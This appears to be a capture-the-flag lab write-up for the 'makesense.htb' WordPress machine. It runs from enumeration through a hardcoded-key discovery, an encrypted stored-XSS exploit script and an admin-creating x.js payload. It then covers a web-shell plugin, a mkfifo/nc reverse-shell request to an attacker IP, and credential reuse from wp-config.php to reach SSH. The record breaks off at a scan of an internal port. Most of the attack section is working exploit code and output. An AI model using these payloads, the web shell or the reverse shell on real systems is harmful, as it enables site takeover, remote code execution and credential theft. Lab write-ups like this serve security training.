### Nmap
```
nmap -sV -sC -vv 10.129.40.24

---OUTPUT---
Nmap scan report for 10.129.40.24
Host is up, received echo-reply ttl 63 (0.022s latency).
Scanned at 2026-07-06 05:36:46 EDT for 19s
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE     REASON         VERSION
22/tcp   open     ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNz4cX4T5eERMWbUEHuFD+1SFwwTAr3tU5E2wQzRQ6m2CzIj/2/fMOU+k/mcyoI0WAXs9PEHIV1H0f+i6JieDRg=
|   256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7SOmIxHJJ8xGjcGaXoiw/5Y7wL3lR3K0SZvc11DnyQ
80/tcp   filtered http        no-response
443/tcp  open     ssl/http    syn-ack ttl 63 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 300D1A4D961AFBA74971BD26D6E7D037
|_http-title: Agency LLC
| ssl-cert: Subject: commonName=makesense.htb
| Issuer: commonName=makesense.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-29T16:37:29
| Not valid after:  2126-05-05T16:37:29
| MD5:     137e 40f1 46c6 4920 684e 34dc 3a8e 8887
| SHA-1:   a53c 8772 c319 515b 0b1d 42eb 2327 a5f7 1115 2a61
| SHA-256: 59e3 04ab 3225 c2f6 3984 c784 ad89 508d 0baf 8b57 357b 0b2e d597 21d9 5a5b ead5
| -----BEGIN CERTIFICATE-----
| MIIDEzCCAfugAwIBAgIUR42EgNimQclxF1KIe6qw9biQMRYwDQYJKoZIhvcNAQEL
| BQAwGDEWMBQGA1UEAwwNbWFrZXNlbnNlLmh0YjAgFw0yNjA1MjkxNjM3MjlaGA8y
| MTI2MDUwNTE2MzcyOVowGDEWMBQGA1UEAwwNbWFrZXNlbnNlLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAMAnoA091ROmtJRgwPNyKwQVSUGFbxJe
| yJc2Z7n/Je+8gRC1kE3a2l/OMYUv8nywTAtZINLH5qBrROeiTxuKgR8owzG8cGl1
| yR7qt+V++3mIlPL/PHXUqq1qbVpjOIQMUv+I943I3D+sPIsqOkgBYZIPTbKmGyEp
| IxzC/C/pzyLQ8vsyeEnrHLO4o/vvOcsaM0nSjHGy2nxfRomjydrTGnpJJW6mRHVw
| tZQeYRIhVSJmLzdUZ82c+m9ukK4TjaXCv7uvvTLa6C/QGekAzrIe97EgJiwjg0St
| M6Y/Rvhu86w7bhBW+zsYD12c4XMsL7rkG/xvo8Z/twwIu79NwtisVrUCAwEAAaNT
| MFEwHQYDVR0OBBYEFDxcc9+OiExeUGXr8GW4QgyKFEW2MB8GA1UdIwQYMBaAFDxc
| c9+OiExeUGXr8GW4QgyKFEW2MA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL
| BQADggEBAIt8w+pLWhT1cbnVGIfrzNsomEZmrOmwrXtr7kDedmZ8rEEWm1xfwSJg
| bjxil1DY6II/Mx+735lX8YOjGhEY7TbCILu9Y/ADTJJ2SoPoN8+mpow2qREZU4v8
| 29MZdxjpgu8XIOaG+Ey/y0363YFBvFZA2r+eaa3cl2HfEhgK+FY1V3wiGIytqGmn
| vAHZGf6yqHWVz80KDJqjVr7KqLs8fE9TyUq/ZyALzQaNZmXmy1SVGr925yMCRNKB
| tzywkBy38ImY5001Oy6rMm27hpsspUixpF5GxUJRRwstVvoyl7Z0NIYaDDRzHrvs
| D0QNYd9rk+JXxcZSffNRxk1CNSj0fpM=
|_-----END CERTIFICATE-----
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 7.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
8001/tcp filtered vcom-tunnel no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- HTTPS site :
![[Pasted image 20260706053849.png]]


![[Pasted image 20260706053952.png]]

![[Pasted image 20260706054447.png]]

- Looking at burpsuite I see there is a call to wp-admin when sending a message. So accessing `https://makesense.htb/wp-admin` led to `wp-login/php` login:

![[Pasted image 20260706054510.png]]

![[Pasted image 20260706054425.png]]

- Gobuster also revealed the same:
```
gobuster dir -u https://makesense.htb \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip,php,aspx --no-tls-validation -b 301

---OUTPUT---
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://makesense.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   301
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              zip,php,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-login.php         (Status: 200) [Size: 4640]
wp-trackback.php     (Status: 200) [Size: 135]
xmlrpc.php           (Status: 405) [Size: 42]
wp-signup.php        (Status: 302) [Size: 0] [--> https://makesense.htb/wp-login.php?action=register]

```
![[Pasted image 20260706074950.png]]

- Checking WPSCAN
```
wpscan --url https://makesense.htb --disable-tls-checks --enumerate u,vp,vt --api-token "icNg2rZttZZ4mw5Mucestc9MmCbaePsbec2G7sJNAcM"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://makesense.htb/ [10.129.40.24]
[+] Started: Mon Jul  6 08:12:28 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://makesense.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://makesense.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).
 | Found By: Meta Generator (Passive Detection)
 |  - https://makesense.htb/, Match: 'WordPress 7.0'
 | Confirmed By: Atom Generator (Aggressive Detection)
 |  - https://makesense.htb/?feed=atom, <generator uri="https://wordpress.org/" version="7.0">WordPress</generator>

[+] WordPress theme in use: webagency
 | Location: https://makesense.htb/wp-content/themes/webagency/
 | Style URL: https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0
 | Style Name: WebAgency
 | Style URI: https://example.com
 | Description: Modern web development agency theme with Tailwind CSS...
 | Author: WebAgency Team
 | Author URI: https://example.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:15 <=============================================================================================================================================================================> (652 / 652) 100.00% Time: 00:00:15
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] walter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jake
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 21

[+] Finished: Mon Jul  6 08:12:47 2026
[+] Requests Done: 671
[+] Cached Requests: 712
[+] Data Sent: 178.697 KB
[+] Data Received: 191.284 KB
[+] Memory used: 316.129 MB
[+] Elapsed time: 00:00:19
```

- There is a theme and a directory
- Directory: `https://makesense.htb/wp-content/uploads/` which contains a voice message in directory 1
![[Pasted image 20260706071918.png]]

![[Pasted image 20260706071957.png]]
- Voice notes says its testing something by Jake (last bit says `Lagen 4923`)

- On the theme doing a gobuster reveals a `.git` directory:
```
gobuster dir \
-u https://makesense.htb/wp-content/themes/webagency/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-x php,bak,zip,old \
-k -b 301

---OUTPUT---
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://makesense.htb/wp-content/themes/webagency/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   301
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              old,php,bak,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.git/logs/           (Status: 200) [Size: 34914]

```
![[Pasted image 20260706074151.png]]

- Found nothing interesting

- Going back to wpscan we know there is a webagency theme.
- Browsing to `/webagency/assets` we find something interesting specifically in the path: `[https://makesense.htb/wp-content/themes/webagency/assets/js/main.js](https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js)`
![[Pasted image 20260707074734.png]]

![[Pasted image 20260707074749.png]]
-  In it we find a hardcoded encryption key : `const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';`
![[Pasted image 20260706093254.png]]

- Furthermore in `main.js` we see how the code really works.
- From claude:
```
main.js handles the voice recorder widget's whole client-side flow, in two phases based on what you found:
Phase 1 — Record & upload raw audio (uploadAudioAndCollapse)

Captures microphone audio into a WAV blob (via the Whisper wrapper's recording logic)
Builds a FormData with:

action: 'save_voice_raw'
nonce: webagency_ajax.nonce
voice_recording: wavBlob (the actual audio file)


POSTs it to webagency_ajax.ajax_url (i.e. admin-ajax.php)
On success, the server responds with a post_id — WordPress has created a draft post/record to hold this voice submission, and that ID is how phase 2 knows which post to update
UI collapses the recording modal into a small corner notification while transcription happens

Phase 2 — Transcribe & save results

Once Whisper (running client-side via Transformers.js) finishes transcribing the audio and generating a summary, main.js encrypts that {transcription, summary} object with AES-GCM using the hardcoded key
Builds a second FormData:

action: 'save_voice_results'
nonce: webagency_ajax.nonce (same nonce, reused)
post_id: postId (from phase 1's response)
encrypted_payload: encryptedPayload


POSTs that to the same admin-ajax.php endpoint
Server decrypts the payload using its own copy of the key, and stores transcription/summary into that post's meta — unsanitized, which is the actual vulnerability

So structurally: phase 1 creates the record and gets an ID, phase 2 fills in the (encrypted, later decrypted server-side) content for that record. That's exactly why your exploit script needed both steps — you can't call save_voice_results cold, because it needs a valid post_id referencing a real record that save_voice_raw already created, plus the nonce that authorizes the request as coming from a legitimate page load.
```

- So mainly we need a nonce and we need to grab the postID to make the upload work.
- The idea is we host a malicious payload `x.js` which we get the adin bot to grab. If we set the right nonce and postID we can use it to create a new admin user via the new-user.php file.

- `x.js` payload:
```
fetch('/wp-admin/user-new.php').then(r => r.text()).then(html => {
    const match = html.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/);
    const nonce = match ? match[1] : '';
    fetch('/wp-admin/user-new.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'action=createuser&user_login=pwn&email=pwn@test.com&pass1=Pwn123!&pass2=Pwn123!&role=administrator&_wpnonce_create-user=' + nonce
    });
});
```

- Note that the nonce her is a different nonce used to create the user.
- There are 2 nonce's here:
```
Nonce #1 — webagency_ajax.nonce

This is the one used in your Python exploit script, for the save_voice_results/save_voice_raw AJAX calls
It's scoped specifically to that AJAX action (WordPress nonces are tied to a specific action name + optionally the current user's session)
Its only job is letting an unauthenticated visitor submit voice data — proving the request came from someone who actually loaded the page recently, not a random hostile POST from nowhere

Nonce #2 — _wpnonce_create-user

This is a completely separate nonce, scoped to the user-new.php admin page's "create user" form
It only exists in the authenticated admin's session — it's generated fresh when the admin's browser loads /wp-admin/user-new.php
x.js has to fetch that page itself (fetch('/wp-admin/user-new.php')) and extract this nonce from the HTML at the moment it runs in the bot's browser, because it can't be predicted or reused from anywhere else — it's tied to the admin's live session, not something you could get in advance

So the two nonces serve entirely different purposes and belong to entirely different trust boundaries:

Nonce #1 lets your Python script (acting as an anonymous visitor) get the malicious payload stored in the first place
Nonce #2 lets x.js, running inside the bot's authenticated browser, prove to WordPress that the user-creation request is coming from a legitimate, currently-logged-in admin session
```

- To get the first nonce we need to know how to access it :
```
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/main.js | grep -i "action\|ajax"

---OUTPUT----
            disableOnInteraction: false,
            action: 'submit_contact_form',
            nonce: webagency_ajax.nonce,
        $.ajax({
            url: webagency_ajax.ajax_url,
        formData.append('action', 'save_voice_raw');
        formData.append('nonce', webagency_ajax.nonce);
            const response = await $.ajax({
                url: webagency_ajax.ajax_url,
            formData.append('action', 'save_voice_results');
            formData.append('nonce', webagency_ajax.nonce);
            const response = await $.ajax({
                url: webagency_ajax.ajax_url,
            formData.append('action', 'save_voice_results');
            formData.append('nonce', webagency_ajax.nonce);
            const response = await $.ajax({
                url: webagency_ajax.ajax_url,
```

- Now we know we can grab the nonce from `formData.append('nonce', webagency_ajax.nonce).`

- We can access it by grepping it when we curl into the website:
```
curl -sk https://makesense.htb/ | grep -A5 "webagency_ajax ="

---OUTPUT---
var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php","nonce":"96609766c2","theme_url":"https://makesense.htb/wp-content/themes/webagency","site_url":"https://makesense.htb"};
//# sourceURL=whisper-wrapper-js-extra
</script>
<script id="whisper-wrapper-js" src="https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0"></script>
<script id="webagency-main-js" src="https://makesense.htb/wp-content/themes/webagency/assets/js/main.js?ver=1.0"></script>
<script id="wp-emoji-settings" type="application/json">
```

- As we can see the nonce is `96609766c2`
- Secondly we need to also see what other data is required to save the voice note:
```
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/main.js | grep -B3 -A15 "'save_voice_results'"

---OUTPUT---
            $('#processingStatus').text('Saving results...');

            const formData = new FormData();
            formData.append('action', 'save_voice_results');
            formData.append('nonce', webagency_ajax.nonce);
            formData.append('post_id', postId);
            formData.append('encrypted_payload', encryptedPayload);

            const response = await $.ajax({
                url: webagency_ajax.ajax_url,
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false
            });

            if (!response.success) {
                throw new Error(response.data?.message || 'Failed to save results');
            }
--
            $('#processingStatus').text('Saving results...');

            const formData = new FormData();
            formData.append('action', 'save_voice_results');
            formData.append('nonce', webagency_ajax.nonce);
            formData.append('post_id', postId);
            formData.append('encrypted_payload', encryptedPayload);

            const response = await $.ajax({
                url: webagency_ajax.ajax_url,
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false
            });

            if (!response.success) {
                throw new Error(response.data?.message || 'Failed to save results');
            }

```

- The inputs required are `action`, `nonce`,`post_id`, and `ecrypted_payload`.
- Now we need to  know what the`post_id` is.
```
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/main.js | grep -B5 "postId ="

---OUTPUT---

            if (!response.success) {
                throw new Error(response.data?.message || 'Failed to upload audio');
            }

            const postId = response.data.post_id;

```

- This tells us we get the `post_id` from the response.
- So the flow is two AJAX calls in sequence:
	- save_voice_raw → uploads audio, returns post_id
	- save_voice_results → uses that post_id + your encrypted payload
- So we need to see what `save_voice_results` expects to save the data. This would require the input from `save_voice_raw` which we saw from the grep earlier:
```
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/main.js | grep -A15 -B15 "'save_voice_raw'"

---OUTPUT---
                $('#callStatus').text('Error processing audio.');
                setTimeout(closeModal, 2000);
            }
        } else {
            closeModal();
        }
    }

    /**
     * Phase 1: Upload raw audio and collapse modal to corner notification
     */
    async function uploadAudioAndCollapse(audioBuffer, wavBlob) {
        $('#callStatus').text('Uploading audio...');

        const formData = new FormData();
        formData.append('action', 'save_voice_raw');
        formData.append('nonce', webagency_ajax.nonce);
        formData.append('voice_recording', wavBlob, 'voice-message.wav');

        try {
            const response = await $.ajax({
                url: webagency_ajax.ajax_url,
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false
            });

            if (!response.success) {
                throw new Error(response.data?.message || 'Failed to upload audio');
            }

```

- As we see it requires `action`, `nonce`, and `voice_recording`
- With this we have everything we need and can build our exploit code:
```
cat exploit.py     

---OUTPUT---                   
#!/usr/bin/env python3
import requests
import json
import re
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import os
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import urllib3
urllib3.disable_warnings()
ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
TARGET_URL = "makesense.htb"
ATTACKER_IP = "10.10.16.9"
def get_nonce():
    r = requests.get(f"https://{TARGET_URL}/", verify=False)
    match = re.search(r'"nonce":"([a-f0-9]+)"', r.text)
    return match.group(1) if match else None
def encrypt_payload(payload):
    encoder = json.dumps(payload).encode('utf-8')
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(ENCRYPTION_KEY.encode('utf-8'))
    key = digest.finalize()
    iv = os.urandom(12)
    cipher = AESGCM(key)
    ciphertext = cipher.encrypt(iv, encoder, None)
    combined = iv + ciphertext
    return base64.b64encode(combined).decode('utf-8')
def send_payload(encrypted_payload, nonce, post_id):
    url = f"https://{TARGET_URL}/wp-admin/admin-ajax.php"
    try:
        response = requests.post(
            url,
            data={
                'action': 'save_voice_results',
                'nonce': nonce,
                'post_id': post_id,
                'encrypted_payload': encrypted_payload
            },
            verify=False,
            timeout=10
        )
        print(f"[+] Response: {response.status_code} - {response.text}")
        return response.text
    except Exception as e:
        print(f"[-] Error: {e}")
        return None
def start_http_server(port=8000):
    x_js = '''
fetch('/wp-admin/user-new.php').then(r => r.text()).then(html => {
    const match = html.match(/name="_wpnonce_create-user"\\s+value="([^"]+)"/);
    const nonce = match ? match[1] : '';
    fetch('/wp-admin/user-new.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'action=createuser&user_login=pwn&email=pwn@test.com&pass1=Pwn123!&pass2=Pwn123!&role=administrator&_wpnonce_create-user=' + nonce
    });
});
'''
    with open('x.js', 'w') as f:
        f.write(x_js)
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] HTTP server started on port {port}")
    return server
def upload_raw_audio(nonce):
    url = f"https://{TARGET_URL}/wp-admin/admin-ajax.php"
    
    # Minimal valid WAV header (silent, ~0 duration) - just needs to pass upload validation
    wav_bytes = bytes.fromhex(
        '52494646' '24000000' '57415645' '666d7420' '10000000'
        '01000100' '80bb0000' '00770100' '02001000' '64617461' '00000000'
    )
    
    files = {'voice_recording': ('voice-message.wav', wav_bytes, 'audio/wav')}
    data = {'action': 'save_voice_raw', 'nonce': nonce}
    
    try:
        response = requests.post(url, data=data, files=files, verify=False, timeout=10)
        print(f"[+] Raw upload response: {response.status_code} - {response.text}")
        result = response.json()
        return result.get('data', {}).get('post_id')
    except Exception as e:
        print(f"[-] Error uploading raw audio: {e}")
        return None
def main():
    print(f"[*] Target: {TARGET_URL} | Attacker: {ATTACKER_IP}")
    server = start_http_server(8000)
    time.sleep(1)
    nonce = get_nonce()
    if not nonce:
        print("[-] Could not extract nonce, aborting.")
        return
    print(f"[+] Got nonce: {nonce}")
    post_id = upload_raw_audio(nonce)
    if not post_id:
        print("[-] Could not get post_id, aborting.")
        return
    print(f"[+] Got post_id: {post_id}")
    payload = {
        "transcription": f'<script src="http://{ATTACKER_IP}:8000/x.js"></script>',
        "summary": "s"
    }
    encrypted = encrypt_payload(payload)
    print(f"[+] Encrypted: {encrypted[:50]}...")
    send_payload(encrypted, nonce, post_id)
    print("[*] Waiting for admin bot (30s)...")
    time.sleep(30)
    print("[*] Check HTTP server log above for a GET /x.js hit.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.shutdown()
if __name__ == '__main__':
    main()
```

- Executing it:
```
python3 exploit.py                                                                                             
[*] Target: makesense.htb | Attacker: 10.10.16.9
[+] HTTP server started on port 8000
[+] Got nonce: 96609766c2
[+] Raw upload response: 200 - {"success":true,"data":{"message":"Audio saved, processing started.","post_id":75}}
[+] Got post_id: 75
[+] Encrypted: yKGQQt0fADES8MSohcSK88N0LGkeHO1wHkKJcTowJjyji6RJB7...
[+] Response: 200 - {"success":true,"data":{"message":"Results saved successfully!","post_id":75}}
[*] Waiting for admin bot (30s)...
10.129.41.75 - - [07/Jul/2026 08:34:10] "GET /x.js HTTP/1.1" 200 -
[*] Check HTTP server log above for a GET /x.js hit.
[+] Login successful! User 'pwn' with Password `Pwn123!` created and authenticated.
[+] Final URL: https://makesense.htb/wp-admin/
10.129.41.75 - - [07/Jul/2026 08:35:11] "GET /x.js HTTP/1.1" 200 -

```

- Alternatively we can do this manually (make sure we create `x.js`:
- Host server
```
python3 -m http.server 8000
```

- Get the nonce:
```
curl -sk https://makesense.htb/ | grep -o '"nonce":"[a-f0-9]*"'

---OUTPUT---
"nonce":"96609766c2"

```

- Upload a dummy wav file. We could use the wav file we got initially:
```
curl -sk -F "action=save_voice_raw" -F "nonce=9e39546208" \    
  -F "voice_recording=@voice-message.wav;type=audio/wav" \
  https://makesense.htb/wp-admin/admin-ajax.php
  
---OUTPUT---
{"success":true,"data":{"message":"Audio saved, processing started.","post_id":77}}
```
- Build and encrypt our payload with the encryption`
```
cat encrypt.py

---OUTPUT---
import json, os, base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
payload = {"transcription": '<script src="http://10.10.16.9:8000/x.js"></script>', "summary": "s"}

digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
digest.update(ENCRYPTION_KEY.encode())
key = digest.finalize()
iv = os.urandom(12)
ct = AESGCM(key).encrypt(iv, json.dumps(payload).encode(), None)
print(base64.b64encode(iv + ct).decode())
```

- Getting the encrypted b64 text:
```
python3 encrypt.py 

---OUTPUT---
Q27S1Y6LQLHYSUh5/peAl9EerMr6oYLUZG3QZGOtN93PIvFyrkSFmp6ONZhNVd1s74aMXZ1Q1XXaqyzkUslU1smGfJpIHfO09RAoPEFZ6gqa22lYJWnnEYyiAV5IwURkP/wxiZiYUm/dW7VSQ0lVx/wsZPu36w==
```

- Finally we send out payload with our python server running:
```
curl -sk https://makesense.htb/wp-admin/admin-ajax.php \
  --data-urlencode "action=save_voice_results" \
  --data-urlencode "nonce=9e39546208" \
  --data-urlencode "post_id=77" \
  --data-urlencode "encrypted_payload=Q27S1Y6LQLHYSUh5/peAl9EerMr6oYLUZG3QZGOtN93PIvFyrkSFmp6ONZhNVd1s74aMXZ1Q1XXaqyzkUslU1smGfJpIHfO09RAoPEFZ6gqa22lYJWnnEYyiAV5IwURkP/wxiZiYUm/dW7VSQ0lVx/wsZPu36w=="
  
  ---OUTPUT---
{"success":true,"data":{"message":"Results saved successfully!","post_id":77}}
```

- We should get a hit on our server
![[Pasted image 20260707084827.png]]

- We should now be able to log in with our new user `Pwn` and password `Pwn123!`

- After we log in as admin we can create our reverse shell plugin:
- We can create a basic one :
```
cat wshell.php:

---OUTPUT---
<?php
/**
 * Plugin Name: WShell
 */
if(isset($_REQUEST['c'])) {
    echo '<pre>';
    system($_REQUEST['c']);
    echo '</pre>';
}
```

- zip it:
```
mkdir wshell
mv shell.php wshell
zip -r wshell.zip wshell/
```

![[Pasted image 20260707085930.png]]
- Note if you use a webshell from github it may be too big and youll receive exceeds limits error:

![[Pasted image 20260707085905.png]]


- Else a success like this:
![[Pasted image 20260707090303.png]]
- We can then access it at : https://makesense.htb/wp-content/plugins/wshell/wshell.php?c=id
![[Pasted image 20260707090328.png]]

- I capture the packet in burpsuite and enter my payload to grab a shell from here:
```
---BURP-REQUEST---
GET /wp-content/plugins/wshell/wshell.php?c=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+10.10.16.9+9999+>/tmp/f HTTP/1.1
Host: makesense.htb
Cookie: wordpress_sec_666f3cbf9610031df176da93aa83bc38=pwn%7C1783600207%7CG4VpyGXxLXQ3bCwmBuJzfIBQ1wAiMlQUoUpaEGgDMbo%7Cae9e964d5211a0732f8b6b45c3d4e024b083906ca6bdbd2410f8f8d9f1444e06; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=pwn%7C1783600207%7CG4VpyGXxLXQ3bCwmBuJzfIBQ1wAiMlQUoUpaEGgDMbo%7C79d83ff5b6b90e712c7be75483d86d8c96eab8799a3e4007e6eef94f772eacbf; wp_lang=en_US; wp-settings-time-5=1783429371
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

```

-I get a shell as `www-data`

![[Pasted image 20260707091226.png]]

- Looking at `wp-config.php` in `/var/www/html` I get credentials for user `walter`:
```
cd /var/www/html
cat wp-config.php


---RELEVANT-OUTPUT---
// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );

```

- I switch to user walter and log in via ssh:
```
ssh walter@makesense.htb
> JbhHDAEgXvri3!
```
![[Pasted image 20260707091740.png]]

- I grab the user flag:
![[Pasted image 20260707091818.png]]

### Privilege Escalation

- Looking at open ports I find port `8001` is open internally which is unusual.
```
ss -tlnp
---OUTPUT---
State         Recv-Q        Send-Q                Local Address:Port                 Peer Address:Port        Process        
LISTEN        0             4096                     127.0.0.54:53                        0.0.0.0:*                          
LISTEN        0             511                         0.0.0.0:443                       0.0.0.0:*                          
LISTEN        0             4096                      127.0.0.1:8001                      0.0.0.0:*                          
LISTEN        0             4096                        0.0.0.0:22                        0.0.0.0:*                          
LISTEN        0             511                         0.0.0.0:80                        0.0.0.0:*                          
LISTEN        0             4096                  127.0.0.53%lo:53                        0.0.0.0:* 
```
![[Pasted image 20260707091901.png]]

- I reconnect with ssh forwarding that port:
```
ssh walter@makesense.htb -L 8001:127.0.0.1:8001
> JbhHDAEgXvri3!
```

- Going to the browser it prompts for creds which I can use walters creds:
![[Pasted image 20260707092256.png]]

- After signing in we find its a draw to text app:
![[Pasted image 20260707092328.png]]

We can write and it will convert the image into text and we can then save the file.

- passing nmap on it we see its an OCR related app:
```
nmap -sV -sC -vv 127.0.0.1 -p 8001

---OUTPUT---
Nmap scan report for localhost (127.0.0.1)
Host is up, received localhost-response (0.0011s latency).
Scanned at 2026-07-07 05:03:56 EDT for 8s

PORT     STATE SERVICE REASON         VERSION
8001/tcp open  http    syn-ack ttl 64 PHP cli server 5.5 or later (PHP 8.3.6)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
